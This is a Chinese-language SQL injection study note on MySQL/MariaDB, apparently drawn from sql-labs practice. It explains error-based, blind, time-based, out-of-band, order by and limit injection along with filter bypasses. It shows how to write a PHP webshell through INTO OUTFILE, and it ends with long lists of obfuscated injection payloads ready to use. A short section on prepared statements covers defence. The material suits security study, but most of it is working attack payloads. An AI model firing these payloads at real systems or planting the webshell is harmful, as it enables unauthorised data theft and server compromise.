实验环境：

​    mysql  Ver 15.1 Distrib 10.5.9-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper

不同的环境会特别指出。

## 第一部分 准备

### 可以利用的数据库

#### mysql5.0以上

默认生成的information_schema

* information_schema
  * SCHEMATA 存储该用户的（show databases能查看到的）所有数据库名
  * TABLES 该用户的所有数据库名和表名
  * COLUMNS 该用户的所有库名、表名、字段名

### 可以使用的函数和变量

#### mysql

* 信息获取
  
  * database() 当前数据库

* version() 当前版本

* user() 当前用户

* @@datadir 数据库路径

* @@version_compile_os——操作系统版本

* 字符连接
  
  * concat(str1,str2,...)没有分隔符连接字符串

* concat_ws(separator,str1,str2,...)有分隔符连接字符串

* group_concat(字段名)，将一个字段以一行显示，默认分隔符为逗号

* 字符切片
  
  * substr(字段名,起始位置,长度) 字符串截取函数，起始位置从1开始
  * left(),right()   left(str,n)和substr(str,1,n)作用相同

* 字符转换
  
  * **注意**：unicode编码和utf-8、utf-16的区别，前者是字符的编码方式，构造一个表，将所有的字符赋予编码，但这个编码并非其保存于计算机内部的数据，相应的编码转换成什么数据，转换规则就是utf-8、utf-16。
  
  * ord()函数，返回字符串的第一个字符的字节代码的十进制值（单字节即是ASCII码，多字节就是字节码的值）
  
  * chr()和ord的功能相反
  
  * ascii() 返回字符串的第一个字符的ascii码，如果第一个字符为多字节，则返回第一个字节
  
  * bin oct hex 将十进制转为2 8 16进制，conv(value，value的数字进制，要转换的数字进制)

* 字符串查找匹配
  
  * FIND_IN_SET(needle,haystack)，needle是要查找的字符串，haystack是逗号分隔的字符串列表，有三种返回值：1，needle,haystack七一为null返回null。2，匹配成功，返回正整数。3，匹配失败，返回0

* updatexml和extractvalue函数

* - 这两个函数都是mysql内置的对xml进行处理的函数
  - updatexml(XML_document,      XPath_string, new_value)，替换函数
  - extractvalue(XML_document,Xpath)，查询函数
  - XML_document是xml对象名，往往是一个字段名
  - Xpath_string是一个Xpath格式的字符串这种字符串用于定位xml文档中标签的位置
  - new_value是要替换的新字符串

* 延迟执行
  
  * sleep(time)使数据库操作强制停留N秒，可以根据页面的返回判断是否执行成功

* 条件判断
  
  * if(judge,value1,value2)     相当于 ?:三元操作符，judge为真返回value1，反之返回value2,可以理解为什么SQL中的条件判断语句有then了，因为有一个同名的if函数

### 注释相关

#### mysql注释

* \# 可不加空格，单行注释
* \-\-  后面要加空格，单行注释
* /\*\*/ ，多行注释，可以用于SQL语句任何位置，相当于一个空格，**显然不能分割命令和字段，可以插在两个逗号间**
* /\*! 注释或者命令内容 \*/，多行注释，可以用于SQL语句任何位置，但不能分割命令和字段，可以插在两个逗号间。默认将注释内部内容当作sql执行，当！后加上版本号时（5~6位数字，仅作参考），当前版本大于等于该号，内容当成sql，反之为注释。

### 技巧和注意事项

#### mysql

##### 技巧杂谈

* 关键字的运用
  
  - **order by**：后可以接数字，表示按第几列排序；order by后面接字符串或者是任何表达式时，会将接的值插入表中，然后按这一插入字段排序；降序 order by 1 desc；
  - **regexp** 正则注入：select user() regexp '^ro'，user() regexp '^ro'作为一个整体表达式，返回0或者1，这里regexp完全可以是做一个运算符，可以在盲注时帮助判断某些字符的值；
  - **like**：like类似于简易版regexp，select user() like ‘ro%’；

* 其他
  
  - 可以在一个数据库下有引用另一个数据库的表，只要使用 数据库.table的形式即可
  
  - \#号直接写入URL中时是作为URL的特殊意义字符使用的，使用#转义时要注意将其转码；也可以使用--空格或者--+注释，url中的查询字段的空格将会被编码成为+，而其他位置的编码将会被编码为%20

##### 数据运算和比较

* **连等,&位运算符** select \* from users where id=1 & 1=1; -- &的优先级高，id=1 & 1=1，即是id=1=1
* **字符串与数字比较** 比较时会把字符串类型转成整数类型，从首字母开始，遇到非数字字符后终止。例如1=‘1“’ 1=‘1")’结果都为1

##### mysql使用编码

* mysql中的值是可以通过二进制编码或者十六进制边编码表示的，字符（字符时无需对引号编码，非ascii字符暂时未实践过）或者数字都可。但是目前看来除值以外的其他，例如关键字和运算符等是不允许编码表示的；除了八进制或者二进制以外，也可以通过concat(char(),char())这样的形式通过编码获得字符串，但是不能用char()+char()的形式，至少 10.5.9-MariaDB-1是不能。

![image-20230806234032490](.\images\image-20230806234032490.png)

![image-20230806234116813](.\images\image-20230806234116813.png)

## 第二部分 类型

### 手注的基本流程

```sql
# 得到所有数据库后猜数据库
select schema_name from information_schema.schemata

# 猜某库的数据表
select table_name from information_schema.tables where table_schema=’xxxxx’

#猜某表的所有列
Select column_name from information_schema.columns where table_name=’xxxxx’

#获取某列的内容
Select *** from ****
```

### 基于从服务器收到的响应

#### 基于错误的 SQL 注入

* 基本原理：服务器端没有对SQL查询出错时的结果进行处理，反而直接回显到浏览器，攻击者可借助回显的相关报错信息进行注入。比较简单的是没有对敏感字符进行过滤，通过报错回显的试验，即可得到数据使用的是单引号还是双引号、有没有括号将其括起来等信息。
* 实例：sqli-lab Less1~Less4
* 总结：

#### 联合查询的类型

* 基本原理：使用union进行注入
* 实例：
* 总结：

#### 堆查询注射

* 基本原理：利用分号，一行执行多个sql语句，依赖于后端使用的何种API
* 实例：
* 总结：堆叠注入使用场景少，但是一旦可以使用，就可以跳出原本后端写好的sql语句的限制，执行其他sql语句。

#### SQL 盲注

​    往往服务器端会对数据库查询的结果做处理，查询结果和报错一般是不会回显的，sql盲注就是针对这一情况，盲注的核心思想是猜测加判断。

##### 基于布尔 SQL 盲注

* 基本原理：在确定注入点后，如果没有报错回显，但是可以判断sql查询是否成功，可以通过and && or ||等逻辑操作符猜测想要的数据。
* 实例:sql-labs Less5,Less8等
* 总结:

```sql
# 核心问题在于没有错误回显,也没有sql查询结果的回显
# 但如果此时的回显信息足够我们判断sql语句是否成功查询了结果,我们可以直接猜测我们需要的字段值,并借助regexp like if(,,) 比较运算符 逻辑运算符 来判断我们的猜测是否正确
# 需要注意逻辑判断符的特性

select * from users where id='-1' or  user() regexp "^[a-z]"  -- 这里的id=-1往往是一个为假的条件，因此需要判断or后的条件是否为真
```

##### 基于时间的 SQL 盲注

* 基本原理：主要结合条件判断和sleep()函数，对页面返回的时间进行估计，从而根据自己的判断条件猜测内容。**前面两种盲注与基于时间的注入相比，或多或少都依赖于回显，而基于时间的注入完全不依赖于回显，而且前两种注入的注入点都要借助回显来发现**，时间注入不许要回显，我们判断某个注入点是否可以注入时，时间注入使我们又多了一种手段。
* 实例：sql-labs 
* 总结：

```sql
If(ascii(substr(database(),1,1))>115,0,sleep(5))%23 -- 条件为假，执行sleep
# 注意sleep()函数的特性和逻辑与运算的特性,以select * from users where id=1 or sleep(1)为例,假设users有十个记录：1，逻辑判断符or的特性是前面为真时就无须判断后面的，所以除了if三目运算符外，可以借助逻辑判断符的这个特性结合sleep()进行时间注入；2，在select users表时，每一个记录都会检查是否符合where后的条件，也就是说sleep会执行多次。

UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;  -- benchmark(次数，表达式)是一个用于测试函数性能的函数，表示让一个表达式/函数执行count次，这会占用较多CPU比sleep更容易暴露。


select * from users where id="-1" or 5<length(database())<10 or sleep(1);
# 关于连续比较 5<length(database())<10，这样的写法一般是不正确的，<是比较运算符，5<length(database())的结果会是0或者1
```

##### 基于报错的 SQL 盲注

* 基本原理：查询结果不回显但是报错会回显，这就引出一个问题，我们如何通过注入得到我们想要的数据，基于报错的盲注就是通过精心构造sql语句使报错中有我们需要的信息。
* 实例：
* 总结：几个常见的报错语句

```sql
Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a; -- error:ERROR 1062 (23000): Duplicate entry '::root@localhost::1' for key 'group_key'
# 注意(select user())的括号

select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2));
select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))    -- 这里没有用到information_schema
select min(@a:=1) from information_schema.tables group by concat(user(),@a:=(@a+1)%2)
# 以上关键在于floor() group by concat()，报错的具体原因网上有很多解释，但是鲜有解答清楚的，注意需要报错回显的内容可以用(select ...)，但是select无法使用group_concat显示一整个字段（这样不会报错），只能使用limit一行一行得到结果

select exp(~(select * from(select user())a)); -- 注意版本，目前试过的5.5.62和10.5.9-MariaDB-11不行，有时候要多试几次
# 产生原因在于double数据溢出

select !(select * from (select user())x) - ~0; -- 同样注意版本
# begint溢出

select extractvalue(1,concat(0x7e,(select @@version),0x7e)) -- 两个参数
select updatexml(1,concat(0x7e,(select @@version),0x7e),1) -- 三个参数
# 利用xpath语法报错
# 注意这里的报错输出有长度限制

select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
# 函数name_const(字段名，字段值) 等同于  字段值 as 字段名这里用重复的字段名报错，字段名为字符串，字段值为常量值。
# select NAME_CONST(version(),1),NAME_CONST(version(),1)需作为子表，name_const无法以select的结果作为参数，与前面的不同
# 三点需要注意：1，报错的原因是(select NAME_CONST(version(),1),NAME_CONST(version(),1))x产生的临时表；2，临时表的产生必须要有(select ...)x或者(select ...) as x的语法，仅有select是不行的，必须给其命名；3，使用name_const(字符串,值)的必要性，name_const()的作用是将字符串作为字段名，值作为字段下的一个值，字符串这里就可以使用一些函数或者变量，在报错的时候就会直接回显这个函数或者变量的字符串。但是(select version(),version())x这种却不行，这个表确实会因为字段重复而报错，但是产生的这个表的字段名是version();
```

* 又是报错的内容过长有省略号，可以采用left、right、substr等函数获取完整内容

#### OOB注入

* 基本原理：OOB即使Out-Of-Band 带外通道技术，用于攻击者通过另一种方式确认和利用没有直接回显的漏洞。一次成功的OOB攻击基于 有漏洞的系统 和 外围防火墙的出站策略。对于SQL注入无法进行SQl盲注时，可以让数据库向我们所控制的服务器（例如DNS服务器）发起请求，我们通过查看服务器上的请求记录，来判断是否注入成功。    例如，使用mysql中的load_file(concat("\\\\\\",(select database()),".UNC地址"))携带敏感信息发起对某个unc地址的请求。UNC路径只有Windows下有，所以在linux下无法获取数据。
  
  Oracle下有函数URL_HTTP.REQUEST进行带外注入。

* 实例：

* 总结：几个常见的报错语句

![image-20230806164821649](.\images\image-20230806164821649.png)

![image-20230806164925146](.\images\image-20230806164925146.png)

注意过长的内容：

![image-20230809212915599](.\images\image-20230809212915599.png)

这里最外部应该缺了一个loadl_file

### 基于如何处理输入的 SQL 查询（数据类型）

#### 基于字符串

* 实例：Less

#### 基于数字或者整数

* 实例：Less2

### 基于程度和顺序的注入(哪里发生了影响)

#### 一阶注入

#### 二阶注入

* 基本原理：二次注入是指先注入进入数据库，然后再次请求时借助已经注入数据库的内容进行攻击，基本过程是第一次注入时，将例如admin'#之类包括特殊字符的字符串存储进入数据库，第二阶段在更改密码等功能页面，sql语句需要读取数据库之前的内容，又没有做好过滤和检查，结果通过存储进数据库的字符串进行注入攻击
* 实例：Less-24
* 总结：这里第一阶段的注入不怕对特殊字符进行转义，只要特殊字符能存入数据库即可，但怕对其进行过滤；第二阶段则需要不对数据库的查询结果进行过滤和转义。

```sql
# 第一阶段
insert into users(username, password) values
```

### 基于注入点的位置

​    前面许多内容的讨论核心都是在确定注入点后我们该如何注入，但实际上sql注入更重要的部分是如何找到注入点，注入点的位置多种多样，除了常见的url的查询参数注入，还有许多其他位置可以注入。

#### 用户输入的表单域

* 原理：与url中的注入没有多少差别，仅仅是注入点的不同，但要注意post的编码和url编码有时存在细微的差别，例如url中空格常用+代替，但是post表单中却不需要
* 实例：
* 总结：

#### cookie

#### 服务器变量（头部信息）

### 其他

#### 宽字节注入

* 原理：宽字节注入是PHP使用的编码（utf-8）与mysql编码（GBK宽字节）不一致导致的。可用于绕过对特殊字符的斜杠转义。
* 实例：

![image-20230823220845964](.\images\image-20230823220845964.png)

单引号被转义

![image-20230823221118251](.\images\image-20230823221118251.png)

在单引号前输入%fd，这在php看来仍是一个特殊字符，后面的单引号也没有受到影响，成功被识别出并在其前面加上了%5c转义，但在mysql的宽字节（两个字节为一个字符）看来，%df%5c是一个完整的汉字，成功逃逸转义

* 总结：

#### order by注入

​    order by的注入要注意的主要是order by本身的用法，注意order by后面可以跟什么内容，

* 可以是整形，表示根据某一列来排序

![image-20230824225426285](.\images\image-20230824225426285.png)

![image-20230824225443761](.\images\image-20230824225443761.png)

![image-20230824225459621](.\images\image-20230824225459621.png)

* 还可以接字段名

![image-20230824225623686](.\images\image-20230824225623686.png)

* 也可以接表达式或者函数或（select ），但注意其作用

![image-20230824230017140](.\images\image-20230824230017140.png)

​    可能有点出人意料，if(database()='security',0,1)返回了0，而语句没有报错。这里很容易产生错误的推断，这是因为还没有弄清order by后面跟的是什么，不管是跟整数还是字段名，他们都直接代表的是按一个对应字段排序，那if(database()='security',0,1)代表哪个字段？

![image-20230824230601303](.\images\image-20230824230601303.png)

​    要知道表达式和的结果并不是一定的，但很显然，order by只能按唯一一个指定的字段排序，那这就是说，那当一个结果定的表达式跟在order by后时到底是何意义呢？其实答案在上图已经给出，if(database()='security',0,1)回变成一个新字段临时加入表中，order by会按这个新的字段排序。还不相信？**（后补充：造成if(database()='security',0,1)不报错的原因是if返回的是字符型）**

![image-20230824231113478](.\images\image-20230824231113478.png)

​    注意这里的执行时间，虽然不是完美的2s，但是也说明了问题。关于接select，也和表达式、函数是同样到道理。这样一来，利用order by进行布尔注入就大大受限了，因为形如if(database()='security',0,1)根本无法判断我们想要判断的内容，我们的布尔注入被限制在了表中的内容，但是延时注入和报错注入仍然可以进行，不过这里要注意延时注入，当sleep(1)插入表时，它可不是仅仅执行了一次。

* 可以跟字符串，单和上一条一样，字符串不会被当作列名D，这也是order by预编译比较麻烦的原因

![image-20230824232100970](.\images\image-20230824232100970.png)

#### 关于order by注入的再次补充

* 无法使用union注入，至少对于mysql 5.5这是不符合语法规则的

* 需要注意的几点：
  
  * select username,password,time from user order by 1，整型1代表select username,password,time from user查询出的第一列，而不是表的第一列，即字段username，而且表达式和函数计算出的整型不能代表字段
  * select username,password,time from user order by xxx(表达式、函数、字符等)等同于select username,password,time,xxx from user order by 4，如果xxx不是字段名，则xxx会作为临时字段加入表中，然后按照该行进行排序
  * **结合上面两点，rand()函数可以有效判断order by是否存在注入，判断依据是注入rand()后每次排序结果都不同**

* 基于if的注入
  
  * 关于if的几点说明：就mysql5.5而言，if的一些表现需要注意
    
    * SELECT product_name,product_price FROM product order BY if(1=2,product_name,product_price)，当product_price为数字型product_name为字符型，则if(1=1,id,name)返回的每一行的id为字符型，所以排序结果也将不同于数字型排序。如果仍需要返回数字型，可以使用+0法或者相关函数显示地将字符转为数字。
    
    ![image-20240416193712276](.\images\image-20240416193712276.png)
    
    ![image-20240416194246393](.\images\image-20240416194246393.png)
    
    ![image-20240416194327994](.\images\image-20240416194327994.png)
    
    * SELECT product_id,product_price FROM product order BY if(1=2,product_id,product_price)当两个字段都为数字型时，if返回的类型也为数字型
    
    ![image-20240416193937075](.\images\image-20240416193937075.png)
  
  * 当我们知道select的表的一些字段名时，我们可以使用if(表达式,id,username)这样的方式根据响应数据的不同进行布尔注入了
  
  * 当我们不知道表的一些字段名时，可以通过if(表达式,1,(select id from information_schema.tables))，(select id from information_schema.tables)为会报错的语句，我们就可以根据是否正常返回数据进行布尔注入
  
  * 延时注入和之前的内容没有太大差别

* 基于rand()的注入
  
  * rand()是一个伪随机函数，rand(1)产生的随机数序列总是一定的，rand(表达式)中的表达式为true和false返回不同排序的数据

* 其他思路：
  
  * OOB注入:
  * 写文件(前提是数据库可以被我们污染):

**payload**

```mysql
(case when substr(CURRENT_USER,1,1)='r' then rand(exp(99999999)) else 1 end)

# 
```



#### limit注入

* 没有order by，可以直接union select
* 有order by，
  * 报错注入 limit 0,1 procedure analyse(updatexml(1,concat(0x3a,user()),1),1);
  * 延时注入 limit 2,0 procedure analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);
  * 有些(PostgreSQL)可以使用布尔注入，核心思想是将limit  后的数字由函数或表达式算出

### 关于insert、update、delete的注入

这些注入与select注入的区别主要在于不能使用union注入、无法写文件上。

一些trick：

* update双查询实现报错注入：

![img](.\images\update、insert、delete注入.md)

这个语句并没有报错出我们想要的字段，因为update users与select from users冲突了，也就是这两个表不相同，这个问题可以通过双查询解决

UPDATE user SET pwd='666666' OR UPDATEXML(1,CONCAT(0x7e,(SELECT CONCAT_WS(':',id,NAME,pwd)FROM (SELECT id,NAME,pwd FROM user)UUU LIMIT 0,1),0x7e),0)OR ''WHERE id=1;

## 第三部分 过滤和绕过

### 后端过滤

#### 一些过滤函数

##### mysql+php过滤例子

* sql-labs Less17的过了函数

```php
function check_input($con1, $value)
{
        if(!empty($value))
        {
                // 限制post参数长度在15内
                $value = substr($value,0,15);
        }

        // php设置中有一个功能，为用户输入的 ‘ " \ 空字符增加反斜杠
        // 该功能在早期php版本中默认开启，7.4.0版本后弃用，8.0.0后移除
        if (get_magic_quotes_gpc())
        {
                // 除去字符串的反斜杠，\\则变为\
                $value = stripslashes($value);
        }

        // 检测是否为数字
        if (!ctype_digit($value))
        {
                // 考虑连接的字符集，对于一些敏感字符进行转义
                // 敏感字符须要在服务器配置中设置，或通过API函数mysqli_set_charset()设置
                $value = "'" . mysqli_real_escape_string($con1, $value) . "'";
        }
        else
        {
                // intval获取变量的整型值
                $value = intval($value);
        }
        return $value;
}
```

#### 一些常见过滤类型及绕过

##### 对注释符的过滤

* 后端简单的对# --进行过滤：不使用注释符，尝试联合注入和两个引号闭合两边，eg，id=1' and id =2 union select @@version,@@datadir,@@version where 1='1 

##### 对关键字的过滤

* 对and or的过滤
  
  * 大小写变形（mysql的关键字和字段名是大小写不敏感的，而数据库名和表名是大小写敏感的）
  * 重复 例如 oorr，将中间的or过滤后得到的就是or
  * and等价于&&，or等价于||
  * 注释绕过，利用/\*!or\*/绕过，但是注意，这里只能绕过仅将单独出现的or过滤的情况
  * `select 123 union /*!50000select*/ '666';` 采用/*! */
  * TODO：编码绕过，这里查了很多的资料，均提到urlencoding、hex和ascii编码可以绕过，但是通过我的实践，这三种编码是不能用于关键字的，不知道是的版本不对还是姿势不对
  
* 对union的过滤 
  
* where的过滤

* 对select和from的过滤

##### 对特殊字符的过滤

* 对空格的过滤
  * 利用其他空白字符替换，例如%09 TAB 键（水平，） %0a 新建一行， %0c 新的一页， %0d return 功能， %0b TAB 键（垂直）， %a0 空格
  * 利用注释符分割

##### 对特殊字符的转义

* 对单双引号进行转义，添加\
  * 可尝试宽字节注入
  * 部分转义函数不对输入的\进行转义，我们可以添加额外的\将转义函数的\ 转义

#### 突破过滤的思路

##### 同义字符、函数替换

* and  &&



### 混淆注入

## 第四部分 利用

### 爆库、拖库

#### 爆库

##### 传统查询方法

##### 工具

#### 拖库

### 拿shell

#### 写木马

主要利用mysql的file权限，对权限要求较高。<a href=" C:\Users\Administrator\Desktop\note-by-Typora\工具和软件\mysql\learnMysql\杂七杂八.md#filePermission">权限详解</a>。

##### PHP

```sql
# 最简单和直接的
select '<?php assert($_POST[less2]);?>' into outfile "路径";
```

#### udf提权

​    严格上这不属于sql注入的内容，udf提权使用的情景是得到了mysql的root权限，且目标服务器不提供web服务时使用。而且，使用udf的的前提仍需要写入文件，所以一些相应的权限也必须拥有，数据库路径等信息也需要知道。

## 第五部分 防御

### 有关预编译的讨论

​    预编译是防御sql注入最好的方法，而且随着现在各种开发框架的成熟，预编译的使用也越来越简单。不过有两种情况下是比较难以采取或者说采取起来不太方便预编译，既表名/列名/动态排序传入和in/like/regexp等模糊匹配的地方。关于注入方式，没太多可讲，这里主要是解释一下他们不能预编译的原因，和如何写预编译。

​    预编译的本质是通过占位符，明确我们所输入的就是数据，从而做到数据与数据库关键字的区分，而如之前order by注入所提到的，order by的特性限制了我们在它后面就不能写数据，而必须写字段名。这就限制了order by进行预编译。

![image-20230824235818953](.\images\image-20230824235818953.png)

​    而对于LIKE/IN等，他们的预编译写法较为特殊，这是因为预编译就相当于为占位符所在的字符加上了引号，再置于必须要加引号的"?%"之中，就会引起变为“‘admin’%”这显然达不到我们的效果，所以正确写法是利用concat拼接字符。

​    而且还要注意，模糊匹配中的那些特殊字符

![image-20230825000250389](.\images\image-20230825000250389.png)

​    例如这里的%，就起到了通配的作用。

## 第六部分 待整理内容

#### pageHelper分页 联结 union 重复列

```sql
# 分页查询,联结有重复的行,这种情况下不会Duplicate column error
SELECT count(0) FROM aoa_director_users AS u LEFT JOIN aoa_director AS d ON d.director_id = u.director_id WHERE u.user_id = ? AND u.director_id IS NOT NULL AND u.is_handle = 1 AND u.catelog_name = 'aaa'
# 但是如果项进行union查询,这里变为子查询,则会有Duplicate column error
SELECT count(0) FROM (select * from aoa_director_users AS u LEFT JOIN aoa_director AS d ON d.director_id = u.director_id WHERE u.user_id = ? AND u.director_id IS NOT NULL AND u.is_handle = 1 AND u.catelog_name = 'aaa' union ...)
```

#### order by 的限制

```xml
<select id="allDirector" resultType="java.util.Map">
        SELECT d.*,u.*
        FROM aoa_director_users AS u LEFT JOIN aoa_director AS d ON 
        d.director_id = u.director_id
        WHERE u.user_id=#{userId} AND u.director_id is NOT null AND u.is_handle=1
        <if test="pinyin !='ALL'">
            AND d.pinyin LIKE '${pinyin}%'
        </if>
        <if test="outtype !=null and outtype !=''">
             AND u.catelog_name = '${outtype}'
        </if>
        <if test="baseKey !=null and baseKey !=''">
        AND
        (d.user_name LIKE '%${baseKey}%' 
        OR d.phone_number LIKE '%${baseKey}%' 
        OR d.companyname LIKE '%${baseKey}%'
        OR d.pinyin LIKE '${baseKey}%'
        OR u.catelog_name LIKE '%${baseKey}%'
        )
        </if>
        order by u.catelog_name
     </select>
```

* 这里如果想进行union注入,后面order by u.catelog_name由于指定了表和字段名,做出了一定限制

```sql
# 可以采用左联结突破限制
SELECT * FROM information_schema.SCHEMATA AS s LEFT JOIN test.user AS u ON s.SQL_PATH=u.name ORDER BY u.pwd
```

* 复杂语句order by无法突破

```sql
# 正确
SELECT * FROM (SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS u ON   n.notice_id=u.relatin_notice_id WHERE  n.title LIKE '%%' union select 1,2,3,4,5,6,7,8 AS type_id,9,10,11,12,13,14 FROM aoa_notice_list AS n)AS n ORDER BY  n.type_id DESC 
# 错误,n.type_id不对
SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS u ON   n.notice_id=u.relatin_notice_id WHERE  n.title LIKE '%%' union select 1,2,3,4,5,6,7,8 AS type_id,9,10,11,12,13,14 FROM aoa_notice_list AS n ORDER BY  n.type_id DESC 
```

#### 其他payload

```txt
1'AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)='
1"AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)="
1/**/AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP/**/(6)))smWE)
1\'AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=\'
1\"AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=\"
1%df'AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=%df'
1%df"AnD(SElEcT*from(SElEcT%20SlEeP/**/(6))a/**/uNIoN/**/SElEcT%201)=%df"
,(if(1=1,%20sleep/**/(6),0))
```

* `EXP(if(1=1,709,710))` EXP(709)是合法的，而710则会因为值超过DOUBLE的范围而报错。这里既可以用于报错注入也可以布尔注入，布尔注入的原理是通过控制if的条件，从而控制SQL语句是否报错（是否能正常返回值）

```txt
1%df' AnD SlEeP(5)%23
1'AnD'1'='1
1'AnD'm'='a
1')AnD('m')=('a
1')AnD('m')=('m
1-1
1-0
1/If(1=1,1,0)
1/If(1=2,1,0)
1'/If(1=1,1,0)||'
1'/If(1=2,1,0)||'
1')/If(1=1,1,0)||('
1')/If(1=2,1,0)||('
1'/If(1=1,1,0) And'1'='1
1'/If(1=2,1,0) And'1'='1
1')/If(1=1,1,0)And('1')=('1=
1')/If(1=2,1,0)And('1')=('1=
1%df'/If(1=1,1,0)--+
1%df'/If(1=2,1,0)--+
1 AnD 0=7
1 AnD 0=0
1'||case when 1=1 then 1 else 1/0 end||'
1'||case when 1=2 then 1 else 1/0 end||'
1'||case when ascii(substr(user,1,1))=65 then 1 else 1/0 end||'
1'||case when ascii(substr(user,1,1))=65 then 0 else 1/1 end||'
1'||case when 1=1 then '' else 'aaaaa' end||'
1'||case when 1=0 then '' else 'aaaaa' end||'
1')||case when 1=1 then 1 else 1/0 end||('
1')||case when 1=2 then 1 else 1/0 end||('
1')||case when 1=1 then '' else 'aaaaa' end||('
1')||case when 1=2 then '' else 'aaaaa' end||('
1||exp(709)
1||exp(710)
1'||EXp(710)||'
1'||EXp(709)||'
1')||EXp(710)||('
1')||EXp(709)||('
1||SlEeP(If(1=1,4,0))
1||SlEeP(If(1=1,0,4))
1'||SlEeP(If(1=1,4,0))||'
1'||SlEeP(If(1=1,0,4))||'
1')||SlEeP(If(1=1,4,0))||('
1')||SlEeP(If(1=1,0,4))||('
1%df'||SlEeP(If(1=1,4,0))--+
1%df'||SlEeP(If(1=1,0,4))--+
1/If(1=1,SlEeP(4),0)
1/If(1=2,SlEeP(4),0)
1'/If(1=1,SlEeP(4),0)||'
1'/If(1=2,SlEeP(4),0)||'
1')/If(1=1,SlEeP(4),0)||('
1')/If(1=2,SlEeP(4),0)||('
1%df'/If(1=1,SlEeP(4),0)--+
1%df'/If(1=2,SlEeP(4),0)--+
1%df'||EXp(710)--+
1%df'||EXp(709)--+
1 RLIKE (SELECT (CASE WHEN (5925=5925) THEN 1 ELSE 0x28 END))
1 RLIKE (SELECT (CASE WHEN (5925=5924) THEN 1 ELSE 0x28 END))
1 AnD If(1=2,EXp(710),EXp(709))
1 AnD If(1=2,EXp(709),EXp(710))
1 AnD SElEcT If(1=2,EXp(710),EXp(709))
1 AnD SElEcT If(1=1,EXp(710),EXp(709))
1'AnD If(1=2,EXp(710),EXp(709))||'
1'AnD If(1=2,EXp(709),EXp(710))||'
1'AnD SElEcT If(1=2,EXp(710),EXp(709))||'
1'AnD SElEcT If(1=1,EXp(710),EXp(709))||'
1')AnD If(1=2,EXp(710),EXp(709))||('
1')AnD If(1=2,EXp(709),EXp(710))||('
1')AnD SElEcT If(1=2,EXp(710),EXp(709))||('
1')AnD SElEcT If(1=1,EXp(710),EXp(709))||('
1'AnD If(1=2,EXp(710),EXp(709))And'1'='1
1'AnD If(1=2,EXp(709),EXp(710))And'1'='1
1'AnD SElEcT If(1=2,EXp(710),EXp(709))And'1'='1
1'AnD SElEcT If(1=1,EXp(710),EXp(709))And'1'='1
1')AnD If(1=2,EXp(710),EXp(709))And('1')=('1=
1'|uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)|'
1'or updatexml(1,if(1=2,1,user()),1)||'
1')||uPdaTeXml(1,CoNCAt(0x7e,current_user,0x7e),1)||('
1'AnD uPdaTeXml(1,CoNCAt(0x7e,(SElEcT database()),0x7e),1)--+
1' Or ExtRacTvaLue(1,CoNCAt(0x7e,(database()))) Or '
ExtRacTvaLue(1,CoNCAt(char(126),md5(1832632439)))
1 AnD 1329=(SElEcT (CASE WHEN (ORD(MID((IfNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))>123) THEN 1329 ELSE (SElEcT 3541 uNIoN SElEcT 9185) END))--+
1 AnD 1329=(SElEcT (CASE WHEN (ORD(MID((IfNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))<123) THEN 1329 ELSE (SElEcT 3541 uNIoN SElEcT 9185) END))--+
1=SlEeP(5)
1'=SlEeP(5) Or '1
1'Or SlEeP(5)='1
1')=SlEeP(5) Or ('1
1 AnD cast(md5('1500755628')asint)>0
1'AnD(SElEcT*from(SElEcT SlEeP/**/(5))a/**/uNIoN/**/SElEcT 1)='
1')AnD(SElEcT*from(SElEcT SlEeP/**/(5))a/**/uNIoN/**/SElEcT 1)=('
1 AnD (SElEcT 8380 FROM (SElEcT(SlEeP(5)))smWE)
1) AnD (SElEcT*from(SElEcT(SlEeP(5)))a)--+
1'AnD (SElEcT 8380 FROM (SElEcT(SlEeP(5)))smWE)
1/**/AnD 0=7
1/**/AnD 0=0
```

```txt
1%df'%20AnD%20SlEeP(5)%23
1'AnD'1'='1
1'AnD'm'='a
1')AnD('m')=('a
1')AnD('m')=('m
1"AnD"c"="c
1"AnD"c"="g
1-1
1-0
1/If(1=1,1,0)
1/If(1=2,1,0)
1'/If(1=1,1,0)||'
1'/If(1=2,1,0)||'
1"/If(1=1,1,0)||"
1"/If(1=2,1,0)||"
1')/If(1=1,1,0)||('
1')/If(1=2,1,0)||('
1")/If(1=1,1,0)||("
1")/If(1=2,1,0)||("
1'/If(1=1,1,0)%20And'1'='1
1'/If(1=2,1,0)%20And'1'='1
1"/If(1=1,1,0)And"1"="1
1"/If(1=2,1,0)And"1"="1
1')/If(1=1,1,0)And('1')=('1=
1')/If(1=2,1,0)And('1')=('1=
1")/If(1=1,1,0)And("1")=("1=
1")/If(1=2,1,0)And("1")=("1=
1%df'/If(1=1,1,0)--+
1%df'/If(1=2,1,0)--+
1 AnD%200=7
1 AnD%200=0
1'||case%20when%201=1%20then%201%20else%201/0%20end||'
1'||case%20when%201=2%20then%201%20else%201/0%20end||'
1'||case%20when%20ascii(substr(user,1,1))=65%20then%201%20else%201/0%20end||'
1'||case%20when%20ascii(substr(user,1,1))=65%20then%200%20else%201/1%20end||'
1'||case%20when%201=1%20then%20''%20else%20'aaaaa'%20end||'
1'||case%20when%201=0%20then%20''%20else%20'aaaaa'%20end||'
